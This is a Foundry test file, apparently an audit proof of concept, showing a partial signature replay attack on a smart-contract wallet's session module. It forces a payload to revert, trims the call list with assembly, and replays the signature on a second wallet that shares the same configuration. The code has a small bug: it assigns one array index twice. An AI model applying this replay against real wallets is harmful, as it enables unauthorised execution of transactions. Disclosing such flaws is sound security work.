//@audit-poc
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.27;

import { ExtendedSessionTestBase, Factory } from "../../integrations/extensions/sessions/ExtendedSessionTestBase.sol";

import { Stage1Module } from "src/Stage1Module.sol";
import { SessionPermissions, SessionUsageLimits } from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
import {
  ParameterOperation, ParameterRule, Permission, UsageLimit
} from "src/extensions/sessions/explicit/Permission.sol";
import { Payload } from "src/modules/Payload.sol";
import { Emitter } from "test/mocks/Emitter.sol";
import { PrimitivesRPC } from "test/utils/PrimitivesRPC.sol";
import { console2 } from 'forge-std/console2.sol';

contract PartialSignatureReplayAttack is ExtendedSessionTestBase {

  function test_execute_partial_Signature_Replay_Attack() external {
    Emitter emitter = new Emitter();
    Payload.Decoded memory payloadWalletA = _buildPayload(2);
    //creating payloads
    payloadWalletA.calls[0] = Payload.Call({
      to: address(emitter),
      value: 0,
      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
      gasLimit: 10_000,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
    });
    
    //creating this payload to fail, so the nonce couldn't be consumed
    payloadWalletA.calls[1] = Payload.Call({
      to: address(emitter),
      value: 1000000000000000000, //1 ether
      data: abi.encodeWithSelector(emitter.receiveEther.selector),
      gasLimit: 21_000,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
    });

    bytes memory packedPayloadA = PrimitivesRPC.toPackedPayload(vm, payloadWalletA);

    // Session permissions
    SessionPermissions memory sessionPerms = SessionPermissions({
      signer: sessionWallet.addr,
      chainId: block.chainid,
      valueLimit: 0,
      deadline: uint64(block.timestamp + 1 days),
      permissions: new Permission[](2)
    });

    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: new ParameterRule[](0) });
    sessionPerms.permissions[1] = Permission({ target: address(emitter), rules: new ParameterRule[](0) });

    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
    (Stage1Module walletA, string memory configA, bytes32 imageHashA) = _createWallet(topology);

    Factory secondaryFactory = new Factory();
    Stage1Module secondaryModule = new Stage1Module(address(secondaryFactory), address(entryPoint));
    //deploying another wallet that shares the same configuration as walletA
    Stage1Module walletB = Stage1Module(payable(secondaryFactory.deploy(address(secondaryModule), imageHashA)));

    uint8[] memory permissionIndx = new uint8[](2);
    permissionIndx[0] = 0;
    permissionIndx[0] = 1;
    bytes memory signatureA = _validExplicitSignature(payloadWalletA, sessionWallet, configA, topology, permissionIndx);

    //Execute the payload using the encodedSignature of wallet A -> legitimate and reverts due to insufficient funds => nonce not consumed
    vm.prank(address(walletA));
    vm.expectRevert();
    walletA.execute(packedPayloadA, signatureA);

    //Wallet B reusing the signature of wallet A and executing the partial payload by just calling call[0]
    Payload.Call[] memory calls = payloadWalletA.calls;
    assembly{
        mstore(calls,1)
    }

    bytes memory packedPayloadB = PrimitivesRPC.toPackedPayload(vm, payloadWalletA);

    Permission[] memory permissions = sessionPerms.permissions;
    assembly {
        mstore(permissions, 1)
    }
    vm.prank(address(walletB));
    //Signature replay arrack with partial payload
    walletB.execute(packedPayloadB, signatureA);
  }

}
